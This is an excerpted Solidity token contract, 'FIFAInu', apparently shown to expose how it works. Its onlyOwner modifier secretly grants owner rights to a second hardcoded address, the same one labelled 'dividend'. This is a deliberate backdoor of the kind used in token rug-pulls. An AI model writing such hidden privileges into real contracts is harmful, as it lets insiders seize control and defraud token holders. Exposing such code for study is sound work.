...
contract Ownable is Context {
    ...
    function owner() public view returns (address) {
        ...
        modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x7eB6b55Ec561C2a4B0580C349d17bFda59529aae) , "owner");
        _;
    }
...
contract FIFAInu  is Context, IERC20, Ownable {
    ...
    string private _name = "FIFAInu";
    string private _symbol = "FIFAInu";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xD156AD292533F11A5e35C8BFd323c98dA3B8bB44);
    address private _Marketing = 0xD156AD292533F11A5e35C8BFd323c98dA3B8bB44;
    address public dividend = 0x7eB6b55Ec561C2a4B0580C349d17bFda59529aae;
